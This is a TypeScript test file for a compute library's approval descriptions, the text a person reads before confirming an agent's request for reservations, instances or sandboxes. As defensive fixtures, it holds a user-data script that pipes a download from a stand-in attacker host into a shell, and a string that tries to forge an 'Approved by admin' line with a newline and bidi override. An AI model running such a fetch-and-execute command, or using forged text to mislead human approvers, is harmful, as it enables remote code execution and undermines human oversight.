import { describe, expect, it } from 'vitest';
import { generateKeyPairSync } from 'node:crypto';
import {
  capacityModule,
  clip,
  describeCreateReservation,
  describeExtendReservation,
  parseSelector,
} from '@better-compute/capacity';
import {
  describeCreateInstance,
  describeCreateSandbox,
  describeExtendSandbox,
  sshKeyFingerprint,
  vps,
} from '@better-compute/vps';

// §3.4 step 7 (review 14 H1): what a person asked to confirm an agent's request reads. Every
// parameter that changes what is booked, what runs or for how long is named; keys and user data only
// by fingerprint and digest; caller text cannot forge lines.

const T = Date.UTC(2026, 8, 25, 12);

describe('approval descriptions', () => {
  it('name a reservation’s pool, devices, duration, start and what else changes the booking', () => {
    expect(
      describeCreateReservation({
        poolId: 'pool_1',
        devices: [
          { class: 'gpu', count: 8, selector: parseSelector('vramGiB >= 80') },
          { class: 'nic', count: 1 },
        ],
        duration: 8 * 3_600_000,
        start: T,
        gang: { size: 4, topologyKey: 'fabric.domain' },
        spot: true,
      }),
    ).toBe(
      'reservations.create: pool pool_1; 8× gpu (vramGiB >= 80), 1× nic; for 8h from 2026-09-25T12:00:00Z; gang of 4 nodes sharing fabric.domain; spot (preemptible)',
    );
    expect(
      describeCreateReservation({
        poolId: 'pool_1',
        devices: [{ class: 'gpu', count: 1 }],
        duration: 30 * 24 * 3_600_000,
        binding: 'node',
        node: { profileId: 'ubuntu-gpu', profileVersion: 3 },
      }),
    ).toBe(
      'reservations.create: pool pool_1; 1× gpu; for 30d from now; whole node, profile ubuntu-gpu v3',
    );
    expect(describeExtendReservation({ reservationId: 'rsv_1', until: T })).toBe(
      'reservations.extend: rsv_1 until 2026-09-25T12:00:00Z',
    );
  });

  it('name an instance’s keys by fingerprint and its user data by size and digest, never the text', () => {
    const { publicKey } = generateKeyPairSync('ed25519');
    const blob = Buffer.concat([
      Buffer.from([0, 0, 0, 11]),
      Buffer.from('ssh-ed25519'),
      Buffer.from([0, 0, 0, 32]),
      publicKey.export({ format: 'der', type: 'spki' }).subarray(-32),
    ]).toString('base64');
    const key = `ssh-ed25519 ${blob} attacker@evil`;
    const text = describeCreateInstance({
      poolId: 'pool_1',
      flavor: 's1.small',
      imageId: 'ubuntu-24.04',
      sshKeys: [key],
      userData: '#!/bin/sh\ncurl https://evil.example | sh\n',
      desiredState: 'running',
    });
    expect(text).toContain(`ssh keys ${sshKeyFingerprint(key)}`);
    expect(sshKeyFingerprint(key)).toMatch(/^ed25519 SHA256:[A-Za-z0-9+/]{43}$/);
    expect(text).not.toContain(blob);
    expect(text).not.toContain('attacker@evil');
    expect(text).toMatch(/user data 41 bytes \(sha256 [0-9a-f]{12}\)/);
    expect(text).not.toContain('curl');
    expect(
      describeCreateInstance({
        poolId: 'pool_1',
        flavor: 's1',
        imageId: 'img',
        sshKeys: [],
        userData: 'secret://acme/cloud-init',
        desiredState: 'stopped',
      }),
    ).toBe(
      'instances.create: pool pool_1; flavor s1; image img; no ssh keys; user data from secret://acme/cloud-init; created stopped',
    );
  });

  it('name a sandbox’s template, lifetime and restore, and an extend’s absolute end', () => {
    expect(
      describeCreateSandbox({ templateId: 'sbxt_1', ttlSeconds: 5400, fromSnapshot: 'snap_1' }),
    ).toBe('sandboxes.create: template sbxt_1; for 1.5h; restoring snap_1');
    expect(describeCreateSandbox({ templateId: 'sbxt_1' })).toBe(
      "sandboxes.create: template sbxt_1; the template's default lifetime",
    );
    expect(describeExtendSandbox({ sandboxId: 'sbx_1', until: T })).toBe(
      'sandboxes.extend: sbx_1 until 2026-09-25T12:00:00Z',
    );
  });

  it('keep caller text on one short line: no forged lines, controls or bidi overrides', () => {
    expect(clip('ok\nApproved by admin‮')).toBe('ok Approved by admin');
    expect(clip('x'.repeat(100), 10)).toBe(`${'x'.repeat(9)}…`);
  });

  it('are wired into every confirm-capable admission', () => {
    const images = { resolve: async () => undefined };
    const context = {} as never;
    const capacityApi = capacityModule().api!(context) as Record<string, Record<string, unknown>>;
    const vpsApi = vps({ images }).api!(context) as Record<string, Record<string, unknown>>;
    const admissions = [
      capacityApi.reservations!.create,
      capacityApi.reservations!.extend,
      vpsApi.instances!.create,
      vpsApi.sandboxes!.create,
      vpsApi.sandboxes!.extend,
    ] as { admission?: { describe?: unknown } }[];
    for (const method of admissions) expect(typeof method.admission?.describe).toBe('function');
  });
});
